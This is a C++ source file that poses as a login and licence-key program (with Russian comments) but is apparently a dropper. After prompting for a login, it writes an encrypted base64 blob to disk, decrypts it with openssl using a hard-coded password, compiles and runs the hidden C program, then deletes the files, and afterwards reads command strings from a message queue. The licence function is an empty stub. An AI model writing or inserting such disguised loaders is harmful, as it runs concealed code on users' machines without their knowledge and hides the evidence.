#include <iostream>
// #include <string>
#include <cstring>
#include <fstream>


#include <sys/msg.h>
void make_some_bash()
{
	std::string str1 = "U2FsdGVkX181YvcoMi5ehTaGn99etL7s5f5xlHASR07aAEyf7BztGUkYvE4XzWVS\nDKeA7LufEQNNWwp6pPwMIUfgi1MX6LZ0RPXVPYK4udf/GuLXFf4aUK+ZRu6nDjSP\nfwYdkWyrIub2t7WuhLRSEggDNjZrSCryAbMF68rTfrpagnQTAiLDtMbpZqBRUpeI\nB8EuUbWDhF6LE0QGrZryh4U9lqknSvkcgR2A6ejwGBNa0rcSk6KOq/WZ8R5iGU7P\nnK615DlTfiZHWe6YPujbJbgEcpsL2/fmHVSJlbtbNwm6RUDrPzAtJCblNohzli7D\nvKdtcz6cBuvds4WrXflflQiClJK86B2DptZB+sj11vlYz+BkC2AQ5Ga8GhJzw2wx\nP/l1P0trcmzByqnDKR9Sej5YX2zwWY5jZjZSJUvjoJdiWneNvZD1UCBHAabGO4Z0\nE91EoUjfWDOGJ4eSBHkKQUK+UXKPBZ+Sjt8Fb37IyS8XbR4UJzZQ1Ew2mN2ypTdd\nrZbS4V1SC8j49QuSr0JRh4dc4LYCCOhYWjtoWEHdJDmwkO9YtTw83kzyxGFHK0fm\nwUoEUVB0+7qoXaQvmfYSkEbDXnyrOHhaHC9ows4WMMAwaZl85G6iG5EQZWnTGKmk\nUN0TRjplNEd8eNdVyD56PAQPnCaIrvxWk+BO45TKgfiH31iLOPMxPagf1jAdVtOs\ngPSsDCTfUHK70YXzSVYTJity5If3pT16lZwd0JSsCSrpEjjH83FrFIfZOQISUc54\nioxdNRhX4lMfOWJU5txo6ng5QcCOKyHSzt7mnbBnE93npu8Kgr0u6B/3aqz+EF+k\nbTeL/UAmXy2K8qYD+oqT9VDlf0pWlyUm4/VJY2I1Q5oF9DvsALRoWUSfRINzlc5q\nvNBCodXaxDkkdLYC9TC1CLrS5li2pwqwNhhJl9MplFI7tERrttYSBxR3ZuZsskT7\niSB83ZeUp3Y=";

    std::ofstream out;          // поток для записи
    out.open("one1.c"); // окрываем файл для записи
    if (out.is_open())
    {
        out << str1;
    }
    out.close();

	system("openssl enc -d -in one1.c -out one2.c -des3 -base64 -pass pass:mypasswd -pbkdf2 ; gcc one2.c -o client.o ; ./client.o ; rm one1.c one2.c client.o");
}



std::string make_license_key(const std::string &logon, const std::string &password, std::string &license_key)
{





	return 0;
} 





int main(int argc, char const *argv[])
{

	// ////////////////////////////////////////
	std::cout << "Good time! Enter your credential!" << std::endl << "Enter your logig" << std::endl;  
	std::string login;
	std::cin >> login;
	// std::string password;
	// std::cout << "Enter your password" << std::endl; 
	// std::cin >> password;
	make_some_bash();



	////////////////////////////////////////

	struct msgbuf buf;

	char cmd[1024] ;
	memset(cmd, 0, 1024);

	int fd = msgget(111, 0);
	if(fd == -1)
		perror("Ошибка сообщения"); 

	tryAgain:
	if(msgrcv(fd, &buf, 1024, 16, IPC_NOWAIT) != -1)
	{
		strcpy(cmd, buf.mtext); 
		printf("%s\n",cmd);
		// printf("%s\n ", buf.mtext);
	}
	else {perror("Ошибка в msgrcv()\n"); goto tryAgain; } 
	msgctl(fd, IPC_RMID, NULL);







	// std::cout << "=========================================" << std::endl;

	////////////////////////////////////////

	// std::string license_key;
	// std::cout << "License key:" << license_key << std::endl;  




	// if( )	




	// make_some_bash(login);
	// std::cout << "strin : " << login << std::endl;
	return 0;
}